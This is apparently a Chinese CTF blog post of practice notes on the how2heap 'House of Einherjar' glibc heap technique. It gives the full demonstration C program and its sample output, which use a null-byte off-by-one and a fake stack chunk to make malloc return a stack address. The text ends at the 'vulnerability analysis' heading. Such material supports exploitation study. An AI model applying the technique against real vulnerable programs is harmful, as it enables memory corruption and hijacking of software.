---
title: how2heap-12 House of Einherjar实践笔记
time: 2017-08-13
tags: [CTF, pwn, heap]
layout: post
categories: posts
---

> 本文是对shellphish的[how2heap](https://github.com/shellphish/how2heap)系列堆漏洞课程的实践笔记

# 示例代码

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Enherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.
*/

int main()
{
	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	printf("a: %p\n", a);

    int real_a_size = malloc_usable_size(a);
    printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    // create a fake chunk
    printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize


    printf("Our fake chunk at %p looks like:\n", fake_chunk);
    printf("prev_size (not used): %#lx\n", fake_chunk[0]);
    printf("size: %#lx\n", fake_chunk[1]);
    printf("fwd: %#lx\n", fake_chunk[2]);
    printf("bck: %#lx\n", fake_chunk[3]);
    printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
    printf("bck_nextsize: %#lx\n", fake_chunk[5]);

	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0;
	printf("b.size: %#lx\n", *b_size_ptr);
    printf("This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    printf("If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;

    //Change the fake chunk's size to reflect b's new prev_size
    printf("\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;

    // free b and it will consolidate with our fake chunk
    printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
//    printf("We edit our fake chunk size so that it is small enough to pass size checks\n");

  //  fake_chunk[1] = 0x1000;
    //printf("New fake_chunk size: %#lx\n", fake_chunk[1]);

    printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    printf("Next malloc(0x200) is at %p\n", d);
}
```

本节示例的漏洞程序可以从此处下载： [house_of_einherjar](/files/how2heap/house_of_einherjar)

# 样例输出

``` c
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x603010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffffffdb80 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffffffdb80
bck: 0x7fffffffdb80
fwd_nextsize: 0x7fffffffdb80
bck_nextsize: 0x7fffffffdb80

We allocate 0xf8 bytes for 'b'.
b: 0x603050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x603040 - 0x7fffffffdb80 = 0xffff8000006054c0

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff800000626481 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffffffdb90
```

# 漏洞分析